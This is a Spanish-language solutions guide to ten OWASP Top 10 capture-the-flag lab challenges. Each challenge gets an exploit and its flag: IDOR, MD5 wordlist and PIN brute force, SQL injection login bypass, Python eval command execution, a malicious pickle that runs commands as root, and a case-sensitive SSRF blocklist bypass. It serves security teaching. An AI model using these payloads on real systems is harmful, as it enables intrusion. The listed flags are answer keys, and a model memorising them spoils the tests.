# Soluciones — Los 10 retos OWASP

Guía paso a paso de cada reto: desde el comando básico que muestra el
comportamiento normal, hasta la solución (a mano o automatizada) que
consigue el flag. Pensado como referencia/corrección, no para mirar
antes de intentarlo — la gracia está en llegar por tu cuenta.

Todos los comandos se corren dentro de la consola del reto, ya
desplegado. El patrón se repite en los 10: **primero el paso básico**
(para ver que la app funciona normal), **después la explotación**.

Ordenado igual que el catálogo en la web: por categoría OWASP, A01 a
A10 (no por dificultad).

---

### A01:2021 — Broken Access Control

## Pedidos sin control de acceso (`idor`) — Básico

**Paso básico:**
```
sudo python3 /app/pedidos.py 1001
```
Muestra tu propio pedido (usuario "invitado").

**Solución:** nada impide pedir otro número. El pedido `1337` es de
"admin" y tiene el flag:
```
sudo python3 /app/pedidos.py 1337
```

**Flag:** `FLAG{idor_nunca_confies_en_el_id_del_cliente}`

---

### A02:2021 — Cryptographic Failures

## Credenciales con MD5 sin sal (`crypto-debil`) — Básico

**Paso básico:**
```
sudo python3 /app/login.py admin 123456
```
Dice "Clave incorrecta" — 123456 no es la clave real.

**Solución a mano:** mirar la wordlist y probar una por una:
```
cat wordlist.txt
sudo python3 /app/login.py admin primavera2023
```

**Solución automatizada:**
```
for clave in $(cat wordlist.txt); do sudo python3 /app/login.py admin "$clave"; done
```

**Flag:** `FLAG{md5_sin_sal_se_rompe_con_una_wordlist}`

---

### A03:2021 — Injection

## Login vulnerable (`injection-sqli`) — Básico

**Paso básico:**
```
sudo python3 /app/app.py
```
Pide usuario y clave. Con `invitado` / `invitado123` entra normal, sin
flag.

**Solución:** la consulta SQL se arma concatenando texto. Comentando el
resto de la consulta con `--` se salta la comprobación de la clave:
```
Usuario: admin' -- 
Clave: (cualquier cosa)
```

**Flag:** `FLAG{injection_bypassa_el_login_sin_clave}`

---

### A04:2021 — Insecure Design

## Cupón sin límite de usos (`diseno-inseguro`) — Intermedio

**Paso básico:**
```
sudo python3 /app/tienda.py BIENVENIDA10
```
Descuenta $10 (el saldo arranca en $50).

**Solución:** el mismo código se puede repetir en la misma línea, sin
límite. Repetirlo 5 veces baja el saldo a $0:
```
sudo python3 /app/tienda.py BIENVENIDA10 BIENVENIDA10 BIENVENIDA10 BIENVENIDA10 BIENVENIDA10
```

**Flag:** `FLAG{sin_limite_de_usos_el_cupon_se_aplica_infinito}`

---

### A05:2021 — Security Misconfiguration

## Backup de configuración olvidado (`misconfig`) — Básico

**Paso básico:**
```
ls -la ~
```
Muestra un archivo que no debería estar ahí: `config.yaml.bak`.

**Solución:**
```
cat config.yaml.bak
sudo python3 /app/panel.py admin SuperClaveTemporal2024
```

**Flag:** `FLAG{el_backup_que_nadie_borro_tenia_las_claves}`

---

### A06:2021 — Vulnerable and Outdated Components

## Calculadora con `eval()` sin sandbox (`componente-vulnerable`) — Intermedio

**Paso básico:**
```
sudo python3 /app/calculadora.py '2+2'
```
Responde "Resultado: 4".

**Solución:** la expresión se evalúa como código Python, no solo como
cuenta matemática. Se puede mandar una expresión que ejecute un comando:
```
sudo python3 /app/calculadora.py "__import__('os').system('cat /app/flag.txt')"
```

**Flag:** `FLAG{un_eval_sin_sandbox_es_ejecucion_de_codigo_disfrazada}`

---

### A07:2021 — Identification and Authentication Failures

## Caja fuerte sin límite de intentos (`auth-fallas`) — Intermedio

**Paso básico:**
```
sudo python3 /app/caja_fuerte.py 0000
```
Dice "PIN incorrecto". El PIN es de 4 dígitos (0000-9999), aleatorio por
instancia.

**Solución automatizada (fuerza bruta):** como no hay límite de
intentos ni demora, un bucle que pruebe las 10.000 combinaciones lo
encuentra:
```
for pin in $(seq -w 0 9999); do
  resultado=$(sudo python3 /app/caja_fuerte.py "$pin")
  if echo "$resultado" | grep -q correcto; then
    echo "PIN encontrado: $pin"
    echo "$resultado"
    break
  fi
done
```

**Flag:** `FLAG{sin_limite_de_intentos_10000_combinaciones_no_alcanzan}`

---

### A08:2021 — Software and Data Integrity Failures

## Backup deserializado sin verificar (`integridad-datos`) — Difícil

**Paso básico:**
```
sudo python3 /app/revisar_backup.py
```
Dice que no hay backup en `/tmp/backup.dat` todavía.

**Solución:** `/tmp` es escribible. Se crea un pickle malicioso que,
al deserializarse, ejecuta un comando (el proceso que lo deserializa
corre como root vía `sudo`, así que ese comando también corre como
root):
```
python3 -c "
import pickle, os
E = type('E', (), {'__reduce__': lambda s: (os.system, ('cat /app/flag.txt',))})
pickle.dump(E(), open('/tmp/backup.dat', 'wb'))
"
sudo python3 /app/revisar_backup.py
```

**Flag:** `FLAG{deserializar_sin_verificar_integridad_es_ejecutar_lo_que_sea}`

---

### A09:2021 — Security Logging and Monitoring Failures

## Token filtrado en un log sin monitoreo (`logging-fallas`) — Intermedio

**Paso básico:**
```
cat ~/sesiones.log
```
Muestra líneas con tokens de sesión en texto plano de distintos
usuarios.

**Solución:** identificar la línea de "admin" y usar ese token:
```
sudo python3 /app/portal.py 8f14e45fceea167a5a36dedd4bea2543
```
(el token exacto varía si se reconstruye la imagen; siempre es el que
aparece en la línea `usuario=admin` de `sesiones.log`)

**Flag:** `FLAG{un_token_en_texto_plano_en_un_log_que_nadie_revisa}`

---

### A10:2021 — Server-Side Request Forgery

## Vista previa con lista negra sensible a mayúsculas (`ssrf`) — Difícil

**Paso básico:**
```
sudo python3 /app/previsualizar.py http://metadata.ctf.local/token
```
Dice "Acceso bloqueado: es un recurso interno".

**Solución:** el bloqueo compara el host tal cual, sensible a
mayúsculas. Escribiendo el mismo host con otra combinación de
mayúsculas se lo esquiva:
```
sudo python3 /app/previsualizar.py http://METADATA.ctf.local/token
```

**Flag:** `FLAG{una_lista_negra_sensible_a_mayusculas_no_bloquea_nada}`

---

## Resumen rápido

| Categoría | Reto | Dificultad | Comando ganador |
|---|---|---|---|
| A01 | Pedidos sin control de acceso | Básico | `pedidos.py 1337` |
| A02 | Credenciales MD5 sin sal | Básico | bucle `for` sobre `wordlist.txt` |
| A03 | Login vulnerable | Básico | `admin' -- ` como usuario |
| A04 | Cupón sin límite de usos | Intermedio | repetir el código 5 veces |
| A05 | Backup de config olvidado | Básico | `cat config.yaml.bak` |
| A06 | Calculadora con `eval()` | Intermedio | `__import__('os').system(...)` |
| A07 | Caja fuerte sin límite | Intermedio | bucle `for` de 0000 a 9999 |
| A08 | Backup deserializado | Difícil | pickle malicioso + `revisar_backup.py` |
| A09 | Token filtrado en log | Intermedio | `cat sesiones.log` + `portal.py <token>` |
| A10 | SSRF por mayúsculas | Difícil | `METADATA.ctf.local` (mayúsculas) |
